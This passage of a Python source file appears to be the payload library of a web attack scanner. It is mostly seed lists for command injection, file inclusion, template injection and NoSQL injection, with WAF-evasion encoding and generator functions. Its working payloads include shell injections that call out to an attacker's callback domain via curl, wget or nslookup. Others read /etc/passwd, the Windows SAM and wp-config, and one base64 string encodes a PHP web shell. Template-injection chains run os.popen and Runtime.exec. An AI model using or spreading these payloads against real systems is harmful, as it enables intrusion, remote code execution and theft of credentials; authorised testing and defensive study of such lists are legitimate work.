        {"raw": "| id; echo CMDI_OK_9", "indicator": "CMDI_OK_9", "ctx": ["all"]},
        {"raw": "``id``", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "$(id;id)", "indicator": "uid=", "ctx": ["all"]},
    ],
    "time": [
        {"raw": "; ping -c 3 127.0.0.1", "threshold": 2.5, "ctx": ["all"]},
        {"raw": "| ping -n 3 127.0.0.1", "threshold": 2.5, "ctx": ["all"]},
        {"raw": "; sleep 3", "threshold": 2.5, "ctx": ["all"]},
        {"raw": "| sleep 3", "threshold": 2.5, "ctx": ["all"]},
        {"raw": "& sleep 3 &", "threshold": 2.5, "ctx": ["all"]},
        {"raw": "&& timeout 3", "threshold": 2.5, "ctx": ["all"]},
        {"raw": "`sleep 3`", "threshold": 2.5, "ctx": ["all"]},
        {"raw": "$(sleep 3)", "threshold": 2.5, "ctx": ["all"]},
        {"raw": "; sleep 5", "threshold": 4.0, "ctx": ["all"]},
        {"raw": "| timeout /t 3 /no-break", "threshold": 2.5, "ctx": ["all"]},
        {"raw": "& ping -n 3 127.0.0.1 &", "threshold": 2.5, "ctx": ["all"]},
        {"raw": "; ping -c 5 127.0.0.1", "threshold": 4.0, "ctx": ["all"]},
        {"raw": "|| sleep 3", "threshold": 2.5, "ctx": ["all"]},
    ],
    "blind_oob": [
        {"raw": "; nslookup {{oob_domain}}", "type": "dns", "ctx": ["all"]},
        {"raw": "| nslookup {{oob_domain}}", "type": "dns", "ctx": ["all"]},
        {"raw": "`nslookup {{oob_domain}}`", "type": "dns", "ctx": ["all"]},
        {"raw": "$(nslookup {{oob_domain}})", "type": "dns", "ctx": ["all"]},
        {"raw": "; curl {{oob_url}}", "type": "http", "ctx": ["all"]},
        {"raw": "| curl {{oob_url}}", "type": "http", "ctx": ["all"]},
        {"raw": "; wget {{oob_url}}", "type": "http", "ctx": ["all"]},
        {"raw": "; ping -c 1 {{oob_domain}}", "type": "dns", "ctx": ["all"]},
        {"raw": "| ping -n 1 {{oob_domain}}", "type": "dns", "ctx": ["all"]},
        {"raw": "; python3 -c 'import urllib; urllib.request.urlopen(\"{{oob_url}}\")'", "type": "http", "ctx": ["all"]},
        {"raw": "& nslookup {{oob_domain}} &", "type": "dns", "ctx": ["all"]},
        {"raw": "&& nslookup {{oob_domain}}", "type": "dns", "ctx": ["all"]},
        {"raw": "; dig +short {{oob_domain}}", "type": "dns", "ctx": ["all"]},
        {"raw": "; host {{oob_domain}}", "type": "dns", "ctx": ["all"]},
        {"raw": "; powershell -c \"Invoke-WebRequest {{oob_url}}\"", "type": "http", "ctx": ["all"]},
        {"raw": "; cmd /c nslookup {{oob_domain}}", "type": "dns", "ctx": ["all"]},
        {"raw": "$(curl {{oob_url}})", "type": "http", "ctx": ["all"]},
        {"raw": "`curl {{oob_url}}`", "type": "http", "ctx": ["all"]},
        {"raw": "; php -r 'file_get_contents(\"{{oob_url}}\");'", "type": "http", "ctx": ["all"]},
    ],
}

LFI_SEEDS: Dict[str, List[dict]] = {
    "traversal": [
        {"raw": "/../" * n + "etc/passwd", "indicator": "root:", "ctx": ["all"]}
        for n in range(1, 8)
    ] + [
        {"raw": "..\\\\" * n + "windows\\\\win.ini", "indicator": "[fonts]", "ctx": ["all"]}
        for n in (1, 3, 5)
    ] + [
        {"raw": "../" * n + "etc/passwd%00", "indicator": "root:", "ctx": ["all"]}
        for n in (1, 2, 3)
    ],
    "encoded": [
        {"raw": "%2e%2e%2f" * 3 + "etc/passwd", "indicator": "root:", "ctx": ["all"]},
        {"raw": "..%252f" * 3 + "etc/passwd", "indicator": "root:", "ctx": ["all"]},
        {"raw": "..%c0%af" * 3 + "etc/passwd", "indicator": "root:", "ctx": ["all"]},
        {"raw": "..%ef%bc%8f" * 3 + "etc/passwd", "indicator": "root:", "ctx": ["all"]},
        {"raw": "%252e%252e%252f" * 3 + "etc/passwd", "indicator": "root:", "ctx": ["all"]},
        {"raw": "%c0%ae%c0%ae%c0%af" * 3 + "etc/passwd", "indicator": "root:", "ctx": ["all"]},
        {"raw": "..%5c" * 3 + "windows\\\\win.ini", "indicator": "[fonts]", "ctx": ["all"]},
        {"raw": "....//" * 3 + "etc/passwd", "indicator": "root:", "ctx": ["all"]},
        {"raw": "..;/" * 3 + "etc/passwd", "indicator": "root:", "ctx": ["all"]},
    ],
    "php_wrappers": [
        {"raw": "php://filter/convert.base64-encode/resource=/etc/passwd", "type": "base64", "ctx": ["all"]},
        {"raw": "php://filter/convert.base64-encode/resource=index", "type": "base64", "ctx": ["all"]},
        {"raw": "php://filter/convert.base64-encode/resource=config.php", "type": "base64", "ctx": ["all"]},
        {"raw": "php://filter/convert.base64-encode/resource=../config", "type": "base64", "ctx": ["all"]},
        {"raw": "php://filter/convert.base64-encode/resource=../wp-config", "type": "base64", "ctx": ["all"]},
        {"raw": "php://filter/read=convert.base64-encode/resource=/etc/passwd", "type": "base64", "ctx": ["all"]},
        {"raw": "php://filter/convert.base64-encode/resource=/etc/hosts", "type": "base64", "ctx": ["all"]},
        {"raw": "php://filter/convert.base64-encode/resource=/var/www/html/index.php", "type": "base64", "ctx": ["all"]},
        {"raw": "php://filter/convert.base64-encode/resource=../etc/passwd", "type": "base64", "ctx": ["all"]},
        {"raw": "expect://id", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "expect://whoami", "indicator": None, "ctx": ["all"]},
        {"raw": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==", "type": "rce", "ctx": ["all"]},
        {"raw": "data://text/plain,<?php echo 123; ?>", "type": "rce", "ctx": ["all"]},
        {"raw": "data://text/plain;base64,cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA==", "type": "rce", "ctx": ["all"]},
        {"raw": "php://input", "type": "rce", "ctx": ["all"]},
        {"raw": "compress.zlib://php://filter/convert.base64-encode/resource=/etc/passwd", "type": "base64", "ctx": ["all"]},
        {"raw": "php://filter/convert.base64-encode/resource=/etc/passwd/resource=1", "type": "base64", "ctx": ["all"]},
        {"raw": "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd", "type": "base64", "ctx": ["all"]},
    ],
    "log_poison": [
        {"raw": "/proc/self/environ", "indicator": "PATH=", "ctx": ["all"]},
        {"raw": "/var/log/apache2/access.log", "indicator": "GET", "ctx": ["all"]},
        {"raw": "/var/log/apache/access.log", "indicator": "GET", "ctx": ["all"]},
        {"raw": "/var/log/nginx/access.log", "indicator": "GET", "ctx": ["all"]},
        {"raw": "/var/log/httpd/access_log", "indicator": "GET", "ctx": ["all"]},
        {"raw": "/var/log/apache2/error.log", "indicator": "PHP", "ctx": ["all"]},
        {"raw": "/var/log/apache/error.log", "indicator": "PHP", "ctx": ["all"]},
        {"raw": "/var/log/nginx/error.log", "indicator": "error", "ctx": ["all"]},
        {"raw": "/var/log/vsftpd.log", "indicator": "FTP", "ctx": ["all"]},
        {"raw": "/var/log/mail.log", "indicator": "mail", "ctx": ["all"]},
        {"raw": "/var/log/sshd.log", "indicator": "sshd", "ctx": ["all"]},
        {"raw": "/proc/self/fd/2", "indicator": None, "ctx": ["all"]},
        {"raw": "/proc/self/fd/1", "indicator": None, "ctx": ["all"]},
    ],
    "windows": [
        {"raw": "c:\\\\boot.ini", "type": "read", "ctx": ["all"]},
        {"raw": "c:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts", "type": "read", "ctx": ["all"]},
        {"raw": "c:\\\\windows\\\\php.ini", "type": "read", "ctx": ["all"]},
        {"raw": "c:\\\\inetpub\\\\wwwroot\\\\web.config", "type": "read", "ctx": ["all"]},
        {"raw": "c:\\\\windows\\\\repair\\\\SAM", "type": "read", "ctx": ["all"]},
        {"raw": "c:\\\\windows\\\\repair\\\\SYSTEM", "type": "read", "ctx": ["all"]},
        {"raw": "c:\\\\windows\\\\win.ini", "indicator": "[fonts]", "ctx": ["all"]},
        {"raw": "..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts", "type": "read", "ctx": ["all"]},
    ],
    "phar_zip": [
        {"raw": "phar://uploads/shell.phar/test.txt", "type": "phar", "ctx": ["all"]},
        {"raw": "zip://uploads/shell.zip%23test.txt", "type": "zip", "ctx": ["all"]},
        {"raw": "phar:///var/www/uploads/shell.phar/test", "type": "phar", "ctx": ["all"]},
    ],
}

SSTI_SEEDS: Dict[str, List[dict]] = {
    "detect": [
        {"raw": "{{7*'7'}}", "indicator": "7777777", "ctx": ["all"]},
        {"raw": "{{config}}", "indicator": "config", "ctx": ["all"]},
        {"raw": "{{'aaaa'.indexOf('b')}}", "indicator": "-1", "ctx": ["all"]},
        {"raw": "{{'aaaa'.indexOf('a')}}", "indicator": "0", "ctx": ["all"]},
        {"raw": "{{[0,1,2].length}}", "indicator": "3", "ctx": ["all"]},
        {"raw": "${7*7}", "indicator": "49", "ctx": ["all"]},
        {"raw": "#{7*7}", "indicator": "49", "ctx": ["all"]},
        {"raw": "{{[].__class__}}", "indicator": "list", "ctx": ["all"]},
        {"raw": "{{'a'.upper()}}", "indicator": "A", "ctx": ["all"]},
        {"raw": "{{999999*999999}}", "indicator": "999998000001", "ctx": ["all"]},
        {"raw": "{{7*7}}", "indicator": "49", "ctx": ["all"]},
        {"raw": "{7*7}", "indicator": "49", "ctx": ["all"]},
        {"raw": "[[7*7]]", "indicator": "49", "ctx": ["all"]},
        {"raw": "<%= 7*7 %>", "indicator": "49", "ctx": ["all"]},
        {"raw": "${999999*999999}", "indicator": "999998000001", "ctx": ["all"]},
        {"raw": "#{999999*999999}", "indicator": "999998000001", "ctx": ["all"]},
        {"raw": "{{'a'|upper}}", "indicator": "A", "ctx": ["all"]},
        {"raw": "{{7**7}}", "indicator": "823543", "ctx": ["all"]},
        {"raw": "${T(java.lang.Math).random()}", "indicator": "0.", "ctx": ["all"]},
        {"raw": "{{'x'|attr('upper')}}", "indicator": "X", "ctx": ["all"]},
    ],
    "blind": [
        {"raw": "{{ cycler.__init__.__globals__.os.popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "{{ lipsum.__globals__.os.popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "{{ namespace.__init__.__globals__.os.popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "{{ config.__class__.__init__.__globals__.os.popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "{{ ''.__class__.__mro__[1].__subclasses__() }}", "indicator": "subclasses", "ctx": ["all"]},
        {"raw": "{{ ''.__class__.__mro__[2].__subclasses__() }}", "indicator": "subclasses", "ctx": ["all"]},
        {"raw": "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}", "indicator": "root:", "ctx": ["all"]},
        {"raw": "{{ ''.__class__.__mro__[1].__subclasses__()[999].__init__.__globals__['os'].popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "{{ cycler.__init__.__globals__.os.popen('whoami').read() }}", "indicator": None, "ctx": ["all"]},
        {"raw": "{{ url_for.__globals__.os.popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "{{[].__class__.__base__.__subclasses__()}}", "indicator": "subclasses", "ctx": ["all"]},
        {"raw": "{{['id']|filter('system')|join(',')}}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "{{['id']|map('system')|join}}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "{%print('x')%}", "indicator": "x", "ctx": ["all"]},
        {"raw": "${7*7}", "indicator": "49", "ctx": ["all"]},
        {"raw": "${'freemarker.template.utility.Execute'?new()('id')}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "${'freemarker.template.utility.Execute'?new()('whoami')}", "indicator": None, "ctx": ["all"]},
        {"raw": "${T(java.lang.Runtime).getRuntime().exec('id')}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "${script['java'].newInstance('java.lang.Runtime').exec('id')}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "#set($x=$rt.getClass().forName('java.lang.Runtime').getRuntime().exec('id'))", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "{system('id')}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "{system('cat /etc/passwd')}", "indicator": "root:", "ctx": ["all"]},
        {"raw": "${__import__('os').popen('id').read()}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "<%= system(\"id\") %>", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "${groovy:Runtime.getRuntime().exec('id')}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "${'a'.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}", "indicator": "uid=", "ctx": ["all"]},
        {"raw": "${\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")}", "indicator": "uid=", "ctx": ["all"]},
    ],
}

NOSQLI_SEEDS: Dict[str, List[dict]] = {
    "boolean": [
        {"raw": "' || '1'=='1' /*", "ctx": ["string"]},
        {"raw": "' || 1==1 //", "ctx": ["string"]},
        {"raw": '" || "1"=="1" //', "ctx": ["string"]},
        {"raw": "' && this.cred == '' //", "ctx": ["string"]},
        {"raw": "admin' || 1==1 //", "ctx": ["string"]},
        {"raw": "admin' --", "ctx": ["string"]},
        {"raw": '"; return true; //', "ctx": ["string"]},
        {"raw": "' || 1==1 || '", "ctx": ["string"]},
        {"raw": "' || 1==1", "ctx": ["string"]},
        {"raw": "' && 1==1 //", "ctx": ["string"]},
        {"raw": "' && 1==2 //", "ctx": ["string"]},
    ],
    "where_time": [
        {"raw": "'; if (1==1) { sleep(3000); } //", "threshold": 2.5, "ctx": ["string"]},
        {"raw": "'; sleep(3000); //", "threshold": 2.5, "ctx": ["string"]},
        {"raw": "' || sleep(3000) || '", "threshold": 2.5, "ctx": ["string"]},
        {"raw": "'; db.sleep(3000); //", "threshold": 2.5, "ctx": ["string"]},
        {"raw": "' || 1==1 || sleep(3000) || '", "threshold": 2.5, "ctx": ["string"]},
    ],
    "json": [
        {"raw": '{"$ne": ""}', "type": "json", "ctx": ["json"]},
        {"raw": '{"$gt": ""}', "type": "json", "ctx": ["json"]},
        {"raw": '{"$regex": ".*"}', "type": "json", "ctx": ["json"]},
        {"raw": '{"$where": "1==1"}', "type": "json", "ctx": ["json"]},
        {"raw": '{"$where": "this.cred == \'\'"}', "type": "json", "ctx": ["json"]},
        {"raw": '{"$or": [{"x": 1}, {"y": 1}]}', "type": "json", "ctx": ["json"]},
        {"raw": '{"$and": [{"x": {"$ne": 1}}, {"y": 1}]}', "type": "json", "ctx": ["json"]},
        {"raw": '{"$in": [""]}', "type": "json", "ctx": ["json"]},
        {"raw": '{"$nin": [""]}', "type": "json", "ctx": ["json"]},
        {"raw": '{"$exists": true}', "type": "json", "ctx": ["json"]},
        {"raw": '{"$ne": null}', "type": "json", "ctx": ["json"]},
        {"raw": '{"$regex": "^.*$"}', "type": "json", "ctx": ["json"]},
        {"raw": '{"$regex": "^(?=.*a)(?=.*b).*$"}', "type": "json", "ctx": ["json"]},
        {"raw": '{"$where": "sleep(5000)"}', "type": "json_time", "ctx": ["json"]},
        {"raw": '{"$function": {"body": "return true;", "args": []}}', "type": "json", "ctx": ["json"]},
    ],
    "error": [
        {"raw": "'", "ctx": ["string"]},
        {"raw": '"', "ctx": ["string"]},
        {"raw": "'\"", "ctx": ["string"]},
        {"raw": "\\'", "ctx": ["string"]},
    ],
}


def _filter_by_context(seeds: List[dict], context: str) -> List[dict]:
    if not context or context == "all":
        return seeds
    return [s for s in seeds if "ctx" not in s or context in s["ctx"] or "all" in s.get("ctx", [])]


def _filter_by_dbms(seeds: List[dict], dbms: Optional[str]) -> List[dict]:
    """DBMS-tagged seeds first (so max_payloads can't cut them), then generic."""
    if not dbms:
        return [s for s in seeds if "dbms" not in s]
    dbms_l = dbms.lower()
    tagged = [s for s in seeds
              if "dbms" in s and str(s.get("dbms", "")).lower() == dbms_l]
    generic = [s for s in seeds if "dbms" not in s]
    if not tagged and any("dbms" in s for s in seeds):
        # No exact match: keep everything rather than dropping coverage.
        return list(seeds)
    return tagged + generic


def generate(seed_group: str, seed_key: str, context: str = "all",
             waf_name: Optional[str] = None,
             max_payloads: int = 50) -> List[dict]:
    groups = {
        "sqli": SQLI_SEEDS,
        "xss": XSS_SEEDS,
        "cmdi": CMDI_SEEDS,
        "lfi": LFI_SEEDS,
        "ssti": SSTI_SEEDS,
        "nosqli": NOSQLI_SEEDS,
    }
    overrides = _load_yaml_overrides()
    if seed_group in overrides:
        groups[seed_group] = dict(groups[seed_group])
        for key_name, entries in overrides[seed_group].items():
            if not isinstance(entries, list):
                continue
            if key_name in groups[seed_group]:
                groups[seed_group][key_name] = list(groups[seed_group][key_name]) + entries
            else:
                groups[seed_group][key_name] = entries
    group = groups.get(seed_group, {})
    seeds = group.get(seed_key, [])
    seeds = _filter_by_context(seeds, context)

    if not seeds:
        return []

    encoders = WAF_STRATEGIES.get(waf_name, WAF_STRATEGIES[None])

    results = []
    for seed in seeds:
        raw = seed["raw"]
        enc_names = encoders.get("priority", WAF_STRATEGIES[None]["priority"])

        if seed_group == "sqli" and seed_key in (
            "time_mysql", "time_mssql", "time_postgres", "time_oracle",
            "time_sqlite", "time_generic", "union", "stacked",
            "boolean_true", "boolean_false", "conditional",
        ):
            # Preserve '=' semantics: hex/url encoding would break the
            # boolean/time comparison inside the SQL statement.
            enc_names = ["case_sql"]

        if seed_group == "xss":
            enc_names = []

        if seed_group == "nosqli":
            enc_names = []

        if seed_group == "ssti":
            enc_names = []

        if seed_group == "lfi":
            enc_names = []

        if seed_group == "cmdi":
            enc_names = ["whitespace_sql"]

        generated = [raw]
        for enc_name in enc_names:
            encoder = ENCODERS.get(enc_name)
            if encoder:
                new_vals = []
                for g in generated:
                    encoded = encoder(g)
                    if isinstance(encoded, list):
                        new_vals.extend(encoded)
                    else:
                        new_vals.append(encoded)
                generated = new_vals

        seen = set()
        uniq = []
        for g in generated:
            if g not in seen:
                seen.add(g)
                uniq.append(g)
        generated = uniq

        for g in generated[:3]:
            entry = dict(seed)
            entry["payload"] = g
            if "raw" in entry:
                del entry["raw"]
            if "ctx" in entry:
                del entry["ctx"]
            results.append(entry)

    if max_payloads and len(results) > max_payloads:
        results = results[:max_payloads]

    return results


def generate_for_dbms(seed_group: str, seed_key: str, dbms: Optional[str],
                      context: str = "all", waf_name: Optional[str] = None,
                      max_payloads: int = 50) -> List[dict]:
    """Generate payloads biased toward one DBMS: generic seeds + dbms-tagged."""
    groups = {
        "sqli": SQLI_SEEDS,
        "xss": XSS_SEEDS,
        "cmdi": CMDI_SEEDS,
        "lfi": LFI_SEEDS,
        "ssti": SSTI_SEEDS,
        "nosqli": NOSQLI_SEEDS,
    }
    overrides = _load_yaml_overrides()
    if seed_group in overrides:
        groups[seed_group] = dict(groups[seed_group])
        for key_name, entries in overrides[seed_group].items():
            if not isinstance(entries, list):
                continue
            if key_name in groups[seed_group]:
                groups[seed_group][key_name] = list(groups[seed_group][key_name]) + entries
            else:
                groups[seed_group][key_name] = entries
    group = groups.get(seed_group, {})
    seeds = group.get(seed_key, [])
    seeds = _filter_by_context(seeds, context)
    seeds = _filter_by_dbms(seeds, dbms)
    if not seeds:
        return []
    results = []
    for seed in seeds:
        raw = seed["raw"]
        enc_names = ["case_sql"] if seed_group == "sqli" else []
        generated = [raw]
        for enc_name in enc_names:
            encoder = ENCODERS.get(enc_name)
            if encoder:
                new_vals = []
                for g in generated:
                    encoded = encoder(g)
                    if isinstance(encoded, list):
                        new_vals.extend(encoded)
                    else:
                        new_vals.append(encoded)
                generated = new_vals
        for g in generated[:2]:
            entry = dict(seed)
            entry["payload"] = g
            entry.pop("raw", None)
            entry.pop("ctx", None)
            results.append(entry)
    if max_payloads and len(results) > max_payloads:
        results = results[:max_payloads]
    return results


def generate_sqli_error(context: str = "string",
                        waf_name: Optional[str] = None) -> List[str]:
    return [p["payload"] for p in generate("sqli", "error", context, waf_name)]


def generate_sqli_boolean(context: str = "string",
                          waf_name: Optional[str] = None) -> List[Tuple[str, str]]:
    trues = generate("sqli", "boolean_true", context, waf_name)
    falses = generate("sqli", "boolean_false", context, waf_name)
    pairs = []
    for t, f in zip(trues, falses):
        pairs.append((t["payload"], f["payload"]))
    return pairs


def generate_sqli_time(waf_name: Optional[str] = None) -> List[str]:
    results = []
    for key in ("time_mysql", "time_mssql", "time_postgres",
                "time_oracle", "time_sqlite", "time_generic"):
        for p in generate("sqli", key, "all", waf_name):
            results.append(p["payload"])
    return results


def generate_sqli_union(context: str = "string",
                        waf_name: Optional[str] = None) -> List[str]:
    return [p["payload"] for p in generate("sqli", "union", context, waf_name)]


def generate_sqli_stacked(context: str = "string",
                          waf_name: Optional[str] = None) -> List[str]:
    return [p["payload"] for p in generate("sqli", "stacked", context, waf_name)]


def generate_sqli_conditional(context: str = "string",
                              waf_name: Optional[str] = None) -> List[str]:
    return [p["payload"] for p in generate("sqli", "conditional", context, waf_name)]


def generate_sqli_time_for(dbms: str, waf_name: Optional[str] = None) -> List[str]:
    key = "time_mysql"
    if dbms == "MSSQL":
        key = "time_mssql"
    elif dbms == "PostgreSQL":
        key = "time_postgres"
    elif dbms == "Oracle":
        key = "time_oracle"
    elif dbms == "SQLite":
        key = "time_sqlite"
    return [p["payload"] for p in generate("sqli", key, "all", waf_name)]


def render_oob_payload(payload: str, oob_domain: str = "", oob_url: str = "") -> str:
    if not payload:
        return payload
    return payload.replace("{{oob_domain}}", oob_domain).replace("{{oob_url}}", oob_url)
